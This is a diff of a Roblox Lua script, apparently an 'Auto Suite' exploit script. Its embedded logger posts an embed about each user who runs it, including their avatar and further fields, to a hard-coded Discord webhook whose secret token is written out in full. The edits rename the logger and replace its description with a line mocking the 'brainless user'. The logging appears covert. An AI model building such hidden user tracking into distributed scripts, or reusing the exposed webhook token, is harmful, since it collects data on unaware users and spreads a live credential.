@@ -12,7 +12,7 @@ local Json      = game:GetService("HttpService")
 local me        = Players.LocalPlayer
 
 
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1559391171774517258/hj-QnNaNcaYJ9eIC92NwP6fRokt84ZsgAiO7Qcbut5MQurihPYgNrdFVUf8iXfSujSes"
+local WEBHOOK = "https://discord.com/api/webhooks/1559391171774517258/hj-QnNaNcaYJ9eIC92NwP6fRokt84ZsgAiO7Qcbut5MQurihPYgNrdFVUf8iXfSujSes"
 
 do
     local HSvc = game:GetService("HttpService")
@@ -90,7 +90,7 @@ do
 
         local embed = {
             title       = "🔓 Script Executed",
-            description = "A user just executed the Auto Suite script.",
+            description = "A brainless user executed da script fak.",
             color       = 0x00C853,
             thumbnail   = { url = pfp },
             fields = {
@@ -106,12 +106,12 @@ do
         }
 
         local payload = HSvc:JSONEncode({
-            username   = "Auto Suite Logger",
+            username   = "Logger",
             avatar_url = pfp,
             embeds     = { embed },
         })
 
-        post(WEBHOOK_URL, payload)
+        post(WEBHOOK, payload)
     end)
 end
 
